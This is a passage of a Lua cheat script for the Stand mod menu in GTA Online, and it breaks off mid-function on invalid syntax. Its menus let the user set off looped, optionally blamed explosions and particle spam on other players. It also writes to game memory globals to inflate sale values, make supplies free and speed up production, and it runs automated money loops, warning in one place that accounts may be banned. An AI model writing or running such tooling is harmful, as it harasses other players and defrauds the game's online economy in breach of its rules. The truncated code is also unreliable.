    ["0x350966FB"] = "Extended Clip",
    ["0x79C77076"] = "Drum Magazine",
    ["0x7BC4CDDC"] = "Flashlight",
    ["0x3CC6BA57"] = "Scope",
    ["0x27872C90"] = "Yusuf Amir Luxury Finish",
    ["0x8D1307B0"] = "Default Clip",
    ["0xBB46E417"] = "Extended Clip",
    ["0x278C78AF"] = "Yusuf Amir Luxury Finish",
    ["0x84C8B2D3"] = "Default Clip",
    ["0x937ED0B7"] = "Extended Clip",
    ["0x4C24806E"] = "Default Clip",
    ["0xB9835B2E"] = "Extended Clip",
    ["0x7FEA36EC"] = "Tracer Rounds",
    ["0xD99222E5"] = "Incendiary Rounds",
    ["0x3A1BD6FA"] = "Hollow Point Rounds",
    ["0xB5A715F"] = "Full Metal Jacket Rounds",
    ["0x9FDB5652"] = "Holographic Sight",
    ["0xE502AB6B"] = "Small Scope",
    ["0x3DECC7DA"] = "Medium Scope",
    ["0xB99402D4"] = "Flat Muzzle Brake",
    ["0xC867A07B"] = "Tactical Muzzle Brake",
    ["0xDE11CBCF"] = "Fat-End Muzzle Brake",
    ["0xEC9068CC"] = "Precision Muzzle Brake",
    ["0x2E7957A"] = "Heavy Duty Muzzle Brake",
    ["0x347EF8AC"] = "Slanted Muzzle Brake",
    ["0x4DB62ABE"] = "Split-End Muzzle Brake",
    ["0xD9103EE1"] = "Default Barrel",
    ["0xA564D78B"] = "Heavy Barrel",
    ["0xC4979067"] = "Digital Camo",
    ["0x3815A945"] = "Brushstroke Camo",
    ["0x4B4B4FB0"] = "Woodland Camo",
    ["0xEC729200"] = "Skull",
    ["0x48F64B22"] = "Sessanta Nove",
    ["0x35992468"] = "Perseus",
    ["0x24B782A5"] = "Leopard",
    ["0xA2E67F01"] = "Zebra",
    ["0x2218FD68"] = "Geometric",
    ["0x45C5C3C5"] = "Boom!",
    ["0x399D558F"] = "Patriotic",
    ["0x476E85FF"] = "Default Clip",
    ["0xB92C6979"] = "Extended Clip",
    ["0xA9E9CAF4"] = "Drum Magazine",
    ["0x4317F19E"] = "Default Clip",
    ["0x334A5203"] = "Extended Clip",
    ["0x6EB8C8DB"] = "Drum Magazine",
    ["0xC164F53"] = "Grip",
    ["0xAA2C45B4"] = "Scope",
    ------------Shotguns-------------
    ["0xE608B35E"] = "Suppressor",
    ["0xA2D79DDB"] = "Yusuf Amir Luxury Finish",
    ["0x85A64DF9"] = "Gilded Gun Metal Finish",
    ["0x94E81BC7"] = "Default Clip",
    ["0x86BD7F72"] = "Extended Clip",
    ["0x837445AA"] = "Suppressor",
    ["0xCD940141"] = "Default Shells",
    ["0x9F8A1BF5"] = "Dragon's Breath Shells",
    ["0x4E65B425"] = "Steel Buckshot Shells",
    ["0xE9582927"] = "Flechette Shells",
    ["0x3BE4465D"] = "Explosive Slugs",
    ["0x3F3C8181"] = "Medium Scope",
    ["0xAC42DF71"] = "Suppressor",
    ["0x5F7DCE4D"] = "Squared Muzzle Brake	",
    ["0xE3BD9E44"] = "Digital Camo",
    ["0x17148F9B"] = "Brushstroke Camo",
    ["0x24D22B16"] = "Woodland Camo",
    ["0xF2BEC6F0"] = "Skull",
    ["0x85627D"] = "Sessanta Nove",
    ["0xDC2919C5"] = "Perseus",
    ["0xE184247B"] = "Leopard",
    ["0xD8EF9356"] = "Zebra",
    ["0xEF29BFCA"] = "Geometric",
    ["0x67AEB165"] = "Boom!",
    ["0x46411A1D"] = "Patriotic",
    ["0x324F2D5F"] = "Default Clip",
    ["0x971CF6FD"] = "Extended Clip",
    ["0x88C7DA53"] = "Drum Magazine",
    ---------Rifles-------------------------------
    ["0xBE5EEA16"] = "Default Clip",
    ["0xB1214F9B"] = "Extended Clip",
    ["0xDBF0A53D"] = "Drum Magazine",
    ["0x4EAD7533"] = "Yusuf Amir Luxury Finish",
    ["0x9FBE33EC"] = "Default Clip",
    ["0x91109691"] = "Extended Clip",
    ["0xBA62E935"] = "Box Magazine",
    ["0xA0D89C42"] = "Scope",
    ["0xD89B9658"] = "Yusuf Amir Luxury Finish",
    ["0xFA8FA10F"] = "Default Clip",
    ["0x8EC1C979"] = "Extended Clip",
    ["0x377CD377"] = "Gilded Gun Metal Finish",
    ["0xC6C7E581"] = "Default Clip",
    ["0x7C8BD10E"] = "Extended Clip",
    ["0x6B59AEAA"] = "Drum Magazine",
    ["0x730154F2"] = "Etched Gun Metal Finish",
    ["0xC5A12F80"] = "Default Clip",
    ["0xB3688B0F"] = "Extended Clip",
    ["0xA857BC78"] = "Gilded Gun Metal Finish",
    ["0x18929DA"] = "Default Clip",
    ["0xEFB00628"] = "Extended Clip",
    ["0x822060A9"] = "Tracer Rounds",
    ["0xA99CF95A"] = "Incendiary Rounds",
    ["0xFAA7F5ED"] = "Armor Piercing Rounds",
    ["0x43621710"] = "Full Metal Jacket Rounds",
    ["0xC7ADD105"] = "Small Scope",
    ["0x659AC11B"] = "Default Barrel",
    ["0x3BF26DC7"] = "Heavy Barrel",
    ["0x9D65907A"] = "Grip",
    ["0xAE4055B7"] = "Digital Camo",
    ["0xB905ED6B"] = "Brushstroke Camo",
    ["0xA6C448E8"] = "Woodland Camo",
    ["0x9486246C"] = "Skull",
    ["0x8A390FD2"] = "Sessanta Nove",
    ["0x2337FC5"] = "Perseus",
    ["0xEFFFDB5E"] = "Leopard",
    ["0xDDBDB6DA"] = "Zebra",
    ["0xCB631225"] = "Geometric",
    ["0xA87D541E"] = "Boom!",
    ["0xC5E9AE52"] = "Patriotic",
    ["0x16C69281"] = "Default Clip",
    ["0xDE1FA12C"] = "Extended Clip",
    ["0x8765C68A"] = "Tracer Rounds",
    ["0xDE011286"] = "Incendiary Rounds",
    ["0x51351635"] = "Armor Piercing Rounds",
    ["0x503DEA90"] = "Full Metal Jacket Rounds",
    ["0xC66B6542"] = "Large Scope",
    ["0xE73653A9"] = "Default Barrel",
    ["0xF97F783B"] = "Heavy Barrel",
    ["0xD40BB53B"] = "Digital Camo",
    ["0x431B238B"] = "Brushstroke Camo",
    ["0x34CF86F4"] = "Woodland Camo",
    ["0xB4C306DD"] = "Skull",
    ["0xEE677A25"] = "Sessanta Nove",
    ["0xDF90DC78"] = "Perseus",
    ["0xA4C31EE"] = "Leopard",
    ["0x89CFB0F7"] = "Zebra",
    ["0x7B82145C"] = "Geometric",
    ["0x899CAF75"] = "Boom!",
    ["0x5218C819"] = "Patriotic",
    ["0x8610343F"] = "Default Clip",
    ["0xD12ACA6F"] = "Extended Clip",
    ["0xEF2C78C1"] = "Tracer Rounds",
    ["0xFB70D853"] = "Incendiary Rounds",
    ["0xA7DD1E58"] = "Armor Piercing Rounds",
    ["0x63E0A098"] = "Full Metal Jacket Rounds",
    ["0x43A49D26"] = "Default Barrel",
    ["0x5646C26A"] = "Heavy Barrel",
    ["0x911B24AF"] = "Digital Camo",
    ["0x37E5444B"] = "Brushstroke Camo",
    ["0x538B7B97"] = "Woodland Camo",
    ["0x25789F72"] = "Skull",
    ["0xC5495F2D"] = "Sessanta Nove",
    ["0xCF8B73B1"] = "Perseus",
    ["0xA9BB2811"] = "Leopard",
    ["0xFC674D54"] = "Zebra",
    ["0x7C7FCD9B"] = "Geometric",
    ["0xA5C38392"] = "Boom!",
    ["0xB9B15DB0"] = "Patriotic",
    ["0x4C7A391E"] = "Default Clip",
    ["0x5DD5DBD5"] = "Extended Clip",
    ["0x1757F566"] = "Tracer Rounds",
    ["0x3D25C2A7"] = "Incendiary Rounds",
    ["0x255D5D57"] = "Armor Piercing Rounds",
    ["0x44032F11"] = "Full Metal Jacket Rounds",
    ["0x833637FF"] = "Default Barrel",
    ["0x8B3C480B"] = "Heavy Barrel",
    ["0x4BDD6F16"] = "Digital Camo",
    ["0x406A7908"] = "Brushstroke Camo",
    ["0x2F3856A4"] = "Woodland Camo",
    ["0xE50C424D"] = "Skull",
    ["0xD37D1F2F"] = "Sessanta Nove	",
    ["0x86268483"] = "Perseus",
    ["0xF420E076"] = "Leopard",
    ["0xAAE14DF8"] = "Zebra",
    ["0x9893A95D"] = "Geometric",
    ["0x6B13CD3E"] = "Boom!",
    ["0xDA55CD3F"] = "Patriotic",
    ["0x513F0A63"] = "Default Clip",
    ["0x59FF9BF8"] = "Extended Clip",
    ["0xC607740E"] = "Drum Magazine",
    ["0x2D46D83B"] = "Default Clip",
    ["0x684ACE42"] = "Extended Clip",
    ["0x6B82F395"] = "Iron Sights",
    -------------Machine-Guns-----------
    ["0xF434EF84"] = "Default Clip",
    ["0x82158B47"] = "Extended Clip",
    ["0x3C00AFED"] = "Scope",
    ["0xD6DABABE"] = "Yusuf Amir Luxury Finish",
    ["0xE1FFB34A"] = "Default Clip",
    ["0xD6C59CD6"] = "Extended Clip",
    ["0x92FECCDD"] = "Etched Gun Metal Finish",
    ["0x492B257C"] = "Default Clip",
    ["0x17DF42E9"] = "Extended Clip",
    ["0xF6649745"] = "Tracer Rounds",
    ["0xC326BDBA"] = "Incendiary Rounds",
    ["0x29882423"] = "Armor Piercing Rounds",
    ["0x57EF1CC8"] = "Full Metal Jacket Rounds",
    ["0xC34EF234"] = "Default Barrel",
    ["0xB5E2575B"] = "Heavy Barrel",
    ["0x4A768CB5"] = "Digital Camo",
    ["0xCCE06BBD"] = "Brushstroke Camo",
    ["0xBE94CF26"] = "Woodland Camo",
    ["0x7609BE11"] = "Skull",
    ["0x48AF6351"] = "Sessanta Nove",
    ["0x9186750A"] = "Perseus",
    ["0x84555AA8"] = "Leopard",
    ["0x1B4C088B"] = "Zebra",
    ["0xE046DFC"] = "Geometric",
    ["0x28B536E"] = "Boom!",
    ["0xD703C94D"] = "Patriotic",
    ["0x1CE5A6A5"] = "Default Clip",
    ["0xEAC8C270"] = "Extended Clip",
    --------------Sniper---------------
    ["0x9BC64089"] = "Default Clip",
    ["0xD2443DDC"] = "Scope",
    ["0xBC54DA77"] = "Advanced Scope",
    ["0x4032B5E7"] = "Etched Wood Grip Finish",
    ["0x476F52F4"] = "Default Clip",
    ["0x94E12DCE"] = "Default Clip",
    ["0xE6CFD1AA"] = "Extended Clip",
    ["0xD77A22D2"] = "Tracer Rounds",
    ["0x6DD7A86E"] = "Incendiary Rounds",
    ["0xF46FD079"] = "Armor Piercing Rounds",
    ["0xE14A9ED3"] = "Full Metal Jacket Rounds",
    ["0x5B1C713C"] = "Zoom Scope",
    ["0x381B5D89"] = "Default Barrel",
    ["0x68373DDC"] = "Heavy Barrel",
    ["0x9094FBA0"] = "Digital Camo",
    ["0x7320F4B2"] = "Brushstroke Camo",
    ["0x60CF500F"] = "Woodland Camo",
    ["0xFE668B3F"] = "Skull",
    ["0xF3757559"] = "Sessanta Nove",
    ["0x193B40E8"] = "Perseus",
    ["0x107D2F6C"] = "Leopard",
    ["0xC4E91841"] = "Zebra",
    ["0x9BB1C5D3"] = "Geometric",
    ["0x3B61040B"] = "Boom!",
    ["0xB7A316DA"] = "Boom!",
    ["0xFA1E1A28"] = "Default Clip",
    ["0x2CD8FF9D"] = "Extended Clip",
    ["0xEC0F617"] = "Incendiary Rounds",
    ["0xF835D6D4"] = "Armor Piercing Rounds",
    ["0x3BE948F6"] = "Full Metal Jacket Rounds",
    ["0x89EBDAA7"] = "Explosive Rounds",
    ["0x82C10383"] = "Zoom Scope",
    ["0xB68010B0"] = "Night Vision Scope",
    ["0x2E43DA41"] = "Thermal Scope",
    ["0x5F7DCE4D"] = "Squared Muzzle Brake",
    ["0x6927E1A1"] = "Bell-End Muzzle Brake",
    ["0x909630B7"] = "Default Barrel",
    ["0x108AB09E"] = "Heavy Barrel",
    ["0xF8337D02"] = "Digital Camo",
    ["0xC5BEDD65"] = "Brushstroke Camo",
    ["0xE9712475"] = "Woodland Camo",
    ["0x13AA78E7"] = "Skull",
    ["0x26591E50"] = "Sessanta Nove",
    ["0x302731EC"] = "Perseus",
    ["0xAC722A78"] = "Leopard",
    ["0xBEA4CEDD"] = "Zebra",
    ["0xCD776C82"] = "Geometric",
    ["0xABC5ACC7"] = "Boom!",
    ["0x6C32D2EB"] = "Patriotic",
    ["0xD83B4141"] = "Default Clip",
    ["0xCCFD2AC5"] = "Extended Clip",
    ["0x1C221B1A"] = "Scope",
    ["0x161E9241"] = "Yusuf Amir Luxury Finish",
    --------Heavy-Weapons---------
    ["0x11AE5C97"] = "Default Clip"
}

remove_attachment_tab = menu.action(weapons, "Give Ammo", {"giveammo"}, "Give ammo for current weapon (fix for stand unlimited ammo not working with special ammo)", --done
    function(on_click)
        local curr_equipped_weapon = WEAPON.GET_SELECTED_PED_WEAPON(PLAYER.GET_PLAYER_PED(players.user()))
        WEAPON.ADD_AMMO_TO_PED(PLAYER.GET_PLAYER_PED(players.user()), curr_equipped_weapon, 10)
    end
)
remove_attachment_tab = menu.action(weapons, "Give All Attachments", {"giveallattachments"}, "Give all attachments from your current weapon", --done
    function(on_click)
        util.toast("Giving all attachments ...")
        local curr_equipped_weapon = WEAPON.GET_SELECTED_PED_WEAPON(PLAYER.GET_PLAYER_PED(players.user()))
        for key, value in pairs(attachments_table) do
          WEAPON.GIVE_WEAPON_COMPONENT_TO_PED(PLAYER.GET_PLAYER_PED(players.user()), curr_equipped_weapon, key)
        end
        util.toast("Done :D")
    end
)
remove_attachment_tab = menu.action(weapons, "Remove All Attachments", {"removeallattachments"}, "Removes all attachments from your current weapon", --done
    function(on_click)
        util.toast("Removing all attachments ...")
        local curr_equipped_weapon = WEAPON.GET_SELECTED_PED_WEAPON(PLAYER.GET_PLAYER_PED(players.user()))
        for key, value in pairs(attachments_table) do
            WEAPON.REMOVE_WEAPON_COMPONENT_FROM_PED(PLAYER.GET_PLAYER_PED(players.user()), curr_equipped_weapon, key)
        end
        util.toast("Done :D")
    end
)
attachment_tab =
    menu.list(weapons, "Add Attachments", {"addattachments"}, "Add attachments to your current weapon")
for key, value in pairs(attachments_table) do
    local curr_equipped_weapon = WEAPON.GET_SELECTED_PED_WEAPON(PLAYER.GET_PLAYER_PED(players.user()))
    if WEAPON.DOES_WEAPON_TAKE_WEAPON_COMPONENT(curr_equipped_weapon, key) == true then --done
        --util.toast(curr_equipped_weapon .. " takes " .. key .. " as attachment") --done
        menu.action(
            attachment_tab,
            value, --done
            {value}, --done
            "Attach " .. value .. "to your current weapon", --done
            function(on_click)
                WEAPON.GIVE_WEAPON_COMPONENT_TO_PED(PLAYER.GET_PLAYER_PED(players.user()), curr_equipped_weapon, key) --done
                --util.toast("Your Weapon '" .. curr_equipped_weapon .. "' should now have the attachment '" .. key) --done
            end
)
    end
end


menu.toggle(weapons, "Autoload Weapons", {"autoloadweapons"}, "Autoload all the weapons everytime you join a new session.", function(state)
    if state then
        players.on_join(function(player_id)
            local my_player_id <const> = players.user()

            if player_id == my_player_id then
                local all_weapons_command_ref <const> = menu.ref_by_path("Self>Weapons>Get Weapons>All Weapons")

                wait_session_transition()
                menu.trigger_command(all_weapons_command_ref)
                util.toast("Weapons loaded successfully. :)")
            end
        end)
    end
end)

players.on_join(function(player_id)

	menu.divider(menu.player_root(player_id), "Addict Script")

    local trolling_net_list <const> = menu.list(menu.player_root(player_id), "Extra Trolling")
    menu.divider(trolling_net_list, "Extra Trolling")

    ------------------------------
    -- Trolling Section
    ------------------------------

    local net_lists <const> = {
        ["Explosions"] = menu.list(trolling_net_list, "Explosions"),
        ["Particles"] = menu.list(trolling_net_list, "Particles"),
    }
    ------------------------------
    -- Explosions Menu
    ------------------------------

    local explosion = {
        loop = false,
        delay = 100,
        shake = 1,
        blamed = false,
        audible = true,
        visible = true,
        damage = true
    }

    local function add_explosion()
        local my_player_ped <const> = players.user_ped()
        local player_pos <const> = players.get_position(player_id)

        if explosion.blamed then
            FIRE.ADD_OWNED_EXPLOSION(
                my_player_ped, player_pos.x, player_pos.y, player_pos.z,
                explosion.type, 1, explosion.audible, not explosion.visible, explosion.shake
            )
        else
            FIRE.ADD_EXPLOSION(
                player_pos.x, player_pos.y, player_pos.z,
                explosion.type, 1, explosion.audible, not explosion.visible, explosion.shake, not explosion.damage
            )
        end
    end

    menu.divider(net_lists["Explosions"], "Explosions")

    menu.action(net_lists["Explosions"], "Explode", {"ssexplode"}, "", function()
        add_explosion()
    end)

    menu.toggle(net_lists["Explosions"], "Explode Loop", {"explodeloop"}, "", function(state)
        explosion.loop = state

        while explosion.loop and players.exists(player_id) do
            add_explosion()
            util.yield(explosion.delay)
        end
    end)

    menu.list_select(net_lists["Explosions"], "Explosion Type", {"explosiontype"}, "", explosion_types, 0, function(value)
            explosion.type = value
    end)

    local explosion_other_net_list <const> = menu.list(net_lists["Explosions"], "Other Settings")
    menu.divider(explosion_other_net_list, "Other Settings")

    menu.slider(explosion_other_net_list, "Explosion Delay", {"explosiondelay"}, "", 50, 1000, 50, 50, function(value)
        explosion.delay = value
    end)

    menu.slider(explosion_other_net_list, "Explosion Shake", {"explosionshake"}, "", 0, 10, 1, 1, function(value)
        explosion.shake = value
    end)

    menu.toggle(explosion_other_net_list, "Explosion Blamed", {"explosionblamed"}, "", function(state)
        explosion.blamed = state
    end)

    menu.toggle(explosion_other_net_list, "Explosion Audible", {"explosionaudible"}, "", function(state)
        explosion.audible = state
    end, true)

    menu.toggle(explosion_other_net_list, "Explosion Visible", {"explosionvisible"}, "", function(state)
        explosion.visible = state
    end, true)

    menu.toggle(explosion_other_net_list, "Explosion Damage", {"explosiondamage"}, "If Explosion Blamed is on, turning this off won't have any effect.", function(state)
        explosion.damage = state
    end, true)
    ------------------------------
    -- Particles Menu
    ------------------------------

    local ptfx = {
        ids = {},
        amount = 1,
        size = 5,
        asset = "core",
        name = "exp_grd_grenade_smoke"
    }

    local function start_ptfx()
        local player_ped <const> = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)

        request_ptfx_asset(ptfx.asset)

        for i = 1, ptfx.amount do
            GRAPHICS.USE_PARTICLE_FX_ASSET(ptfx.asset)

            local ptfx_id <const> = GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY(
                ptfx.name, player_ped,
                0, 0, 0,
                0, 0, 0,
                ptfx.size,
                false, false, false
            )

            table.insert(ptfx.ids, ptfx_id)
        end
    end

    local function remove_ptfx()
        for i, ptfx_id in pairs(ptfx.ids) do
            GRAPHICS.STOP_PARTICLE_FX_LOOPED(ptfx_id, false)
        end
    end

    menu.divider(net_lists["Particles"], "Particles")

    menu.toggle(net_lists["Particles"], "Start PTFX", {"ptfx"}, "", function(state)
        if state then
            start_ptfx()

            while state do
                local is_player_dead <const> = PLAYER.IS_PLAYER_DEAD(player_id)

                if is_player_dead then
                    wait_player_revive(player_id)
                    remove_ptfx()
                    start_ptfx()
                else
                    util.yield(1000)
                end
            end
        else
            remove_ptfx()
        end
    end)

    menu.slider(net_lists["Particles"], "PTFX Amount", {"ptfxamount"}, "", 1, 250, 1, 1, function(value)
        ptfx.amount = value
    end)

    menu.slider(net_lists["Particles"], "PTFX Size", {"ptfxsize"}, "", 1, 10, 5, 1, function(value)
        ptfx.size = value
    end)

    local particles_other_net_list <const> = menu.list(net_lists["Particles"], "Other Settings")
    menu.divider(particles_other_net_list, "Other Settings")

    menu.text_input(particles_other_net_list, "PTFX Asset", {"ptfxasset"}, "", function(value)
        ptfx.offset = value
    end, "core")

    menu.text_input(particles_other_net_list, "PTFX Name", {"ptfxname"}, "",function(value)
        ptfx.name = value
    end, "exp_grd_grenade_smoke")

    menu.hyperlink(particles_other_net_list, "PTFX List", "https://github.com/DurtyFree/gta-v-data-dumps/blob/master/particleEffectsCompact.json#L270", "List of all PTFX and assets.")
end)

------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

	cashloops = menu.list(menu.my_root(), "Cash Loops", {}, "Open Musiness Banager > Special Cargo (Tick all apart from AFK Loop) Then start this cargo loop.", function(); end)

    taximoney = menu.list(cashloops, "Auto TP to Taxi Pickup", {}, "", function(); end)

    menu.action(taximoney, 'Auto TP to Taxi Pickup', {'tptaxifair'}, 'Auto teleports to the Taxi Pickup Person, picks them up and drops them off until you are not in a taxi anymore, skidded from ajoker script.', function()
        util.create_tick_handler(function ()
            local play_car = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), false)
            local vhash = ENTITY.GET_ENTITY_MODEL(play_car)
            if util.reverse_joaat(vhash) ~= 'taxi' or play_car == 0  then
                util.toast('Not in a taxi turning off auto teleport')
                util.stop_thread()
            end
            local taxi_blip = HUD.GET_CLOSEST_BLIP_INFO_ID(280)
            local taxi_ent = HUD.GET_BLIP_INFO_ID_ENTITY_INDEX(taxi_blip)
            local taxi = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(taxi_ent, 0, 6, 0)
            if HUD.DOES_BLIP_EXIST(HUD.GET_CLOSEST_BLIP_INFO_ID(280)) then
                if taxi.x ~= 0 and taxi.y ~= 0 and taxi.z ~= 0 then
                    util.yield(500)
                    PED.SET_PED_COORDS_KEEP_VEHICLE(players.user_ped(), taxi.x, taxi.y, taxi.z, false, false, false, false)
                    util.yield(1500)
                    PAD.SET_CONTROL_VALUE_NEXT_FRAME(0, 86, 1)
                    while HUD.DOES_BLIP_EXIST(HUD.GET_CLOSEST_BLIP_INFO_ID(280)) do
                        util.yield()
                    end
                    util.yield(500)
                    menu.trigger_commands('tpobjective')
                else
                    if set.alert then
                    util.toast('No Person Found')
                    end
                end
                else
                    util.yield()
            end
        end)
        end)

    acidlabmanager = menu.list(cashloops, "Acid Lab Manager", {}, "", function(); end)

menu.divider(acidlabmanager, "Acid Lab Manager")
menu.click_slider(acidlabmanager, "Product Capacity", {"productcapacity"}, "", 0, 1000, 160, 1, function(capacity)
    memory.write_int(memory.script_global(262145 + 18949), capacity) 
end)

menu.toggle(acidlabmanager, "Make Supplies Free", {"supplycost"}, "", function()
    memory.write_int(memory.script_global(262145 + 21869), 0)
end, function()
    memory.write_int(memory.script_global(262145 + 21869), 60000)
end)

menu.toggle(acidlabmanager, "Increase Production Speed", {"increaseproductionspeed"}, "", function()
    memory.write_int(memory.script_global(262145 + 17396), 100) 
end, function()
    memory.write_int(memory.script_global(262145 + 17396), 135000) 
end)

menu.action(acidlabmanager, "Resupply Acid", {"resupplyacid"}, "", function()
    local time = NETWORK.GET_CLOUD_TIME_AS_INT() - memory.read_int(memory.script_global(262145 + 18954))
    memory.write_int(memory.script_global(1648637 + 1 + 6), time)
end)

menu.click_slider(acidlabmanager, "Sell Value Multiplier", {"value"}, "Warning: Tested safe amount is ~2 million. Try not to exceed unless you're bored and don't care about your account.", 0, 10000, 1, 1, function(value)
    memory.write_int(memory.script_global(262145 + 17425), value * 1485) 
end)
 
    cashskids = menu.list(cashloops, "Recovery Loops", {}, "Skidded of course.", function(); end)

local root = cashskids
    
-- dbase = facility
-- businesshub = bunker

local items = {
    settings = {
        root = nil
    },
    presets = {
        root = nil,
        nightclub = {
            root = nil,
            choice = nil,
            afk = nil,
            first_nightclub = nil,
            second_nightclub = nil,
        },
        arcade = {
            root = nil,
            choice = nil
        },
        autoshop = {
            root = nil,
            choice = nil
        },
        agency = {
            root = nil,
            choice = nil
        },
        hanger = {
            root = nil,
            choice = nil
        },
        facility = {
            root = nil,
            choice = nil
        }
    },
    custom = {
        root = nil,
        nightclub = {
            root = nil
        },
        arcade = {
            root = nil
        },
        autoshop = {
            root = nil
        },
        agency = {
            root = nil
        },
        hanger = {
            root = nil
        },
        facility = {
            root = nil
        },
    },
    dax_mission = {
        root = nil,
    },
    casino_figures = {
        root = nil
    }
}

local settings = {
    ownership_check = true,
    verbose = false
}

local stats = {
    nightclub = util.joaat("mp" .. util.get_char_slot() .. "_prop_nightclub_value"),
    arcade = util.joaat("mp" .. util.get_char_slot() .. "_prop_arcade_value"),
    autoshop = util.joaat("mp" .. util.get_char_slot() .. "_prop_auto_shop_value"),
    agency = util.joaat("mp" .. util.get_char_slot() .. "_prop_fixer_hq_value"),
    hanger = util.joaat("mp" .. util.get_char_slot() .. "_prop_hangar_value"),
    office = util.joaat("mp" .. util.get_char_slot() .. "_prop_office_value"),
    bunker = util.joaat("mp" .. util.get_char_slot() .. "_prop_businesshub_value"), -- might not be correct
    facility = util.joaat("mp" .. util.get_char_slot() .. "_prop_defuncbase_value"),
    nightclub_owned = util.joaat("mp" .. util.get_char_slot() .. "_nightclub_owned"),
    arcade_owned = util.joaat("mp" .. util.get_char_slot() .. "_arcade_owned"),
    autoshop_owned = util.joaat("mp" .. util.get_char_slot() .. "_auto_shop_owned"),
    agency_owned = util.joaat("mp" .. util.get_char_slot() .. "_fixer_hq_owned"),
    hanger_owned = util.joaat("mp" .. util.get_char_slot() .. "_hangar_owned"),
    office_owned = util.joaat("mp" .. util.get_char_slot() .. "_office_owned"),
    bunker_owned = util.joaat("mp" .. util.get_char_slot() .. "_businesshub_owned"), -- might not be correct
    facility_owned = util.joaat("mp" .. util.get_char_slot() .. "_dbase_owned")
}

local afk_meta = setmetatable({nc={locations={}, offset=0.05, ragdoll_timer=1}}, {})

local function SIMULATE_CONTROL_KEY(key, times, control=0, delay=300)
    for i = 1, times do
        PAD.SET_CONTROL_VALUE_NEXT_FRAME(control, key, 1)
        util.yield(delay)
    end

    util.yield(100)
end

local function MOVE_CURSOR(x, y, delay=300, autoclick=false)
    PAD.SET_CURSOR_POSITION(x, y)
    util.yield(delay)

    if autoclick then
        SIMULATE_CONTROL_KEY(201, 1)
    end
end

function afk_meta:add_nightclub(x, y, name, id, purchase)
    local location = {x=x, y=y, name=name, id=id, purchase=purchase}
    table.insert(self.nc.locations, location)
end

function afk_meta:purchase_nightclub(name, notify=false)
    if nofify then
        util.toast("Purchasing nightclub: " .. name)
    end

    for key, value in pairs(self.nc.locations) do
        if value.name == name then
            value.purchase()
            break
        end
    end

    if notify then
        util.toast("Nightclub purchased: " .. name)
    end
end

-- add locations for nightclubs
afk_meta:add_nightclub(0.69, 0.58, "La Mesa", 1, function()
    -- purchase the nightclub
    local xptr, yptr = memory.alloc(4), memory.alloc(4)
    GRAPHICS.GET_ACTUAL_SCREEN_RESOLUTION(xptr, yptr)
    local x, y = tonumber(memory.read_int(xptr)), tonumber(memory.read_int(yptr))

    local purchase = function(offsets=nil)
        offsets = offsets or {selection=0, first_buy=0, second_buy=0, third_buy=0}
        MOVE_CURSOR(0.69, 0.58, 300, true) -- select the nightclub
        MOVE_CURSOR(0.30, 0.73, 300, true) -- press the first buy button
        MOVE_CURSOR(0.30, 0.93, 300, true) -- press the second buy button
        MOVE_CURSOR(0.78, 0.91, 300, true) -- press the third buy button
        SIMULATE_CONTROL_KEY(176, 1) -- press enter to purchase
        SIMULATE_CONTROL_KEY(201, 1, 2) -- confirm purchase
        util.yield(1500) -- wait for transaction to complete
        PED.SET_PED_TO_RAGDOLL(players.user_ped(), afk_meta.nc.ragdoll_timer, afk_meta.nc.ragdoll_timer, 2, 0, 0, 0) -- ragdoll to close browser
    end

    purchase()
end)

afk_meta:add_nightclub(0.644, 0.51, "Mission Row", 2, function()
    -- purchase the nightclub
    local xptr, yptr = memory.alloc(4), memory.alloc(4)
    GRAPHICS.GET_ACTUAL_SCREEN_RESOLUTION(xptr, yptr)
    local x, y = tonumber(memory.read_int(xptr)), tonumber(memory.read_int(yptr))

    local purchase = function(offsets=nil)
        offsets = offsets or {selection=0, first_buy=0, second_buy=0, third_buy=0}
        MOVE_CURSOR(0.64, 0.51, 300, true) -- select the nightclub
        MOVE_CURSOR(0.30, 0.73, 300, true) -- press the first buy button
        MOVE_CURSOR(0.30, 0.93, 300, true) -- press the second buy button
        MOVE_CURSOR(0.78, 0.91, 300, true) -- press the third buy button
        SIMULATE_CONTROL_KEY(176, 1) -- press enter to purchase
        SIMULATE_CONTROL_KEY(201, 1, 2) -- confirm purchase
        util.yield(1500) -- wait for transaction to complete
        PED.SET_PED_TO_RAGDOLL(players.user_ped(), afk_meta.nc.ragdoll_timer, afk_meta.nc.ragdoll_timer, 2, 0, 0, 0) -- ragdoll to close browser
    end

    purchase()
end)

afk_meta:add_nightclub(0.479, 0.54, "Vespucci Canals", 10, function()
    -- purchase the nightclub
    local xptr, yptr = memory.alloc(4), memory.alloc(4)
    GRAPHICS.GET_ACTUAL_SCREEN_RESOLUTION(xptr, yptr)
    local x, y = tonumber(memory.read_int(xptr)), tonumber(memory.read_int(yptr))

    local purchase = function(offsets=nil)
        offsets = offsets or {selection=0, first_buy=0, second_buy=0, third_buy=0}
        MOVE_CURSOR(0.479, 0.54, 300, true) -- select the nightclub
        MOVE_CURSOR(0.30, 0.73, 300, true) -- press the first buy button
        MOVE_CURSOR(0.30, 0.93, 300, true) -- press the second buy button
        MOVE_CURSOR(0.78, 0.91, 300, true) -- press the third buy button
        SIMULATE_CONTROL_KEY(176, 1) -- press enter to purchase
        SIMULATE_CONTROL_KEY(201, 1, 2) -- confirm purchase
        util.yield(1500) -- wait for transaction to complete
        PED.SET_PED_TO_RAGDOLL(players.user_ped(), afk_meta.nc.ragdoll_timer, afk_meta.nc.ragdoll_timer, 2, 0, 0, 0) -- ragdoll to close browser
    end

    purchase()
end)

function afk_meta:open_internet(is_loop=false)
    while menu.is_open() do
        if is_loop then
            util.toast("[Recovery] Close Stand menu to start AFK loop")
        end
        util.yield()
    end

    local xptr, yptr = memory.alloc(4), memory.alloc(4)
    GRAPHICS.GET_ACTUAL_SCREEN_RESOLUTION(xptr, yptr)
    local x, y = tonumber(memory.read_int(xptr)), tonumber(memory.read_int(yptr))

    SIMULATE_CONTROL_KEY(27, 1) -- open phone
    SIMULATE_CONTROL_KEY(173, 2) -- scroll down
    SIMULATE_CONTROL_KEY(176, 1) -- select internet
    MOVE_CURSOR(0.25, 0.70, 300, true) -- mazebank hyperlink
    MOVE_CURSOR(0.5, 0.83, 300, true) -- enter mazebank button
    
    switch x do
        case 1920:
